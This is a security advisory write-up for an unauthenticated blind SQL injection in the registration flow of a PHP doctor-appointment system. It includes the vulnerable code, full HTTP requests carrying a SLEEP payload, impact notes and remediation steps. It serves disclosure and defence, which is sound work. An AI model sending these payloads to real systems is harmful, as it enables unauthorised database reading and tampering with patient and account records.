# edoc-doctor-appointment-system SQL Injection (patient self-registration)

> ⚠️ **COVERED / 勿提交**: 提报前查重发现在先披露——**CVE-2023-1058 (create-account.php newemail SQLi — 同文件同参数同根因)**。本目录仅作研究存档,不提交 VulDB。
**CWE-89 · Unauthenticated time-based blind INSERT SQL injection · database enumeration and arbitrary row injection via the public registration flow**

> **Vendor:** HashenUdara
> **Product:** edoc-doctor-appointment-system (vanilla PHP + MySQL via mysqli)
> **Affected version:** n/a — main branch @ cc258425b915d1af9e298777ccd26d160493e68d (latest as of 2026-09-27; no official tagged release)
> **Affected endpoints:** `POST /signup.php` (step 1, session setup) → `POST /create-account.php` (param `newemail`; `tele` and `newpassword` are concatenated as well)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The patient self-registration flow of edoc-doctor-appointment-system concatenates the unauthenticated `POST /create-account.php` parameters `newemail`, `tele` and `newpassword` directly into two `INSERT` statements (`patient` and `webuser`) that are executed with `mysqli::query()`. Because registration is public, any unauthenticated attacker can reach both sinks. The injection is time-based blind (no SQL errors are reflected) and additionally allows INSERT tuple rewriting, so subquery results can be stored into rows that are readable through the application.

## 2. Root Cause

| File:Line | Role |
|---|---|
| `signup.php:28-34` | Step 1 stores `fname/lname/address/nic/dob` in `$_SESSION['personal']` (these values reach the sink from the session, not from POST on this page) |
| `create-account.php:53-56` | Reads `$_POST['newemail']`, `$_POST['tele']`, `$_POST['newpassword']`, `$_POST['cpassword']` with no sanitization |
| `create-account.php:59-63` | Email duplicate check — prepared statement (`bind_param`), **not** injectable |
| `create-account.php:68` | Sink 1 — raw-concatenated `INSERT INTO patient ...` |
| `create-account.php:69` | Sink 2 — raw-concatenated `INSERT INTO webuser ...` |

```php
// create-account.php:53-56
$email=$_POST['newemail'];
$tele=$_POST['tele'];
$newpassword=$_POST['newpassword'];
$cpassword=$_POST['cpassword'];

// create-account.php:68-69  ($database is mysqli)
$database->query("insert into patient(pemail,pname,ppassword, paddress, pnic,pdob,ptel) values('$email','$name','$newpassword','$address','$nic','$dob','$tele');");
$database->query("insert into webuser values('$email','p')");
```

## 3. Prerequisites

- None. The registration page is public; no account or privilege is required.
- The two-step flow only requires keeping the PHP session cookie between step 1 (`signup.php`, which fills `$_SESSION['personal']`) and step 2 (`create-account.php`).
- MySQL strict-mode note: the payload uses numeric-string arithmetic (`'1'+expr+'1'`) so the expression evaluates without strict-mode error 1292 that non-numeric string operands would raise.

## 4. Reproduction

Runnable script: [`poc/poc-registration-sqli.py`](poc/poc-registration-sqli.py) (Python 3 stdlib only). Raw request trace: [`poc/http-requests-registration.txt`](poc/http-requests-registration.txt). Raw verification log: [`evidence/EDOC-01.txt`](evidence/EDOC-01.txt).

```http
# Step 1 - personal details (sets $_SESSION['personal']); keep the session cookie
POST /signup.php HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

fname=Night&lname=Tester&address=1+Test+St&nic=987654321&dob=2000-01-01

# Step 2 - baseline (benign email); responds in ~0.02 s
POST /create-account.php HTTP/1.1
Host: target.local
Cookie: PHPSESSID=<session from step 1>
Content-Type: application/x-www-form-urlencoded

newemail=clean1@test.local&newpassword=x123&cpassword=x123&tele=999

# Step 2 - time-based payload; newemail decodes to: 1'+(SELECT SLEEP(5))+'1
# Responds in ~10.05 s (2 x SLEEP(5): BOTH INSERT statements evaluate the expression)
POST /create-account.php HTTP/1.1
Host: target.local
Cookie: PHPSESSID=<session from step 1>
Content-Type: application/x-www-form-urlencoded

newemail=1%27%2B%28SELECT%20SLEEP%285%29%29%2B%271&newpassword=x123&cpassword=x123&tele=999
```

Stored-value proof that the subquery is evaluated inside the INSERT context:

```sql
SELECT pemail FROM patient WHERE pemail='2';
-- returns "2"  ('1'+(SELECT SLEEP(5))+'1' evaluates numerically to 2)
SELECT email FROM webuser WHERE email='2';
-- returns "2"  (second INSERT sink fires as well)
```

## 5. Confirmed Techniques

Manual time-based blind verification (no sqlmap needed), local isolated instance (MySQL 8.0.39, PHP 8.4.26, `display_errors=0`):

| Request | Payload (`newemail`) | Response time |
|---|---|---|
| Step 2 baseline | `clean1@test.local` | 0.017 s |
| Step 2 payload | `1'+(SELECT SLEEP(5))+'1` | 10.049 s |

The doubled 5 s delay demonstrates that both the `patient` INSERT (line 68) and the `webuser` INSERT (line 69) evaluate the injected expression. The stored rows `pemail='2'` / `email='2'` independently confirm evaluation. The preceding duplicate-check SELECT (lines 59-63) is a prepared statement and is not injectable.

## 6. Impact

- **Unauthenticated database read**: time-based blind oracle allows enumeration of database content; INSERT tuple rewriting (a controlled VALUES position can inject additional columns/values) allows storing subquery results — e.g. `(SELECT version())` — into rows that are then readable through the application.
- **Data / account tampering**: arbitrary rows can be appended to the `patient` table and to `webuser`, the table the application uses for account lookups and role routing.
- **Denial of service**: long `SLEEP()` chains (or nested subqueries) tie up PHP workers and database connections.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (Base 8.2 — High)

## 8. Remediation

1. Replace both concatenated INSERT statements (lines 68-69) with prepared statements using bound parameters (`mysqli::prepare` + `bind_param`, or PDO prepared statements).
2. Validate `newemail` with `filter_var($email, FILTER_VALIDATE_EMAIL)` and reject on failure; validate `tele` server-side (the client-side `pattern` attribute is not a control).
3. Treat session-sourced values (`$_SESSION['personal']`) with the same rigor — they are attacker-controlled at registration time even though they reach the sink from the session.
4. Run the application under a least-privilege database account (no DDL, minimal DML scope).

## 9. References

- Project: https://github.com/HashenUdara/edoc-doctor-appointment-system
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- External disclosure: https://gist.github.com/qianqiusujiu/4f86295b5ee13c2c29aa3bb3cac99ed9
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
